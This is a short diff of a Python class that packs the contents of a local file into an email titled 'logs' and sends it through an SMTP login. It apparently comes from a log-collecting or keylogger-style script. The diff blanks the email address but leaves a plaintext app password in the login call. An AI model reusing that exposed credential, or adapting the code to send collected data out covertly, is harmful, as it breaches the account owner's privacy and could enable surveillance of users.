@@ -39,8 +39,8 @@ class FileManipulator:
     def make_message(cls, content):
         msg = EmailMessage()
         msg['Subject'] = f'logs ~ {datetime.now()}'
-        msg['From'] = 'krunkhehehaha@gmail.com'
-        msg['To'] = 'krunkhehehaha@gmail.com'
+        msg['From'] = 'EMAIL HERE'
+        msg['To'] = 'EMAIL HERE'
         msg.set_content(content)
         return msg
 
@@ -57,7 +57,7 @@ class FileManipulator:
             #starting tls
             s.starttls()
             # Authentication
-            s.login("krunkhehehaha@gmail.com", "doii tpmd gytk vomo")
+            s.login("EMAIL HERE", "doii tpmd gytk vomo")
             #dumping file to message string
             f = open("demofile.txt")
             message = FileManipulator.make_message(f.read())
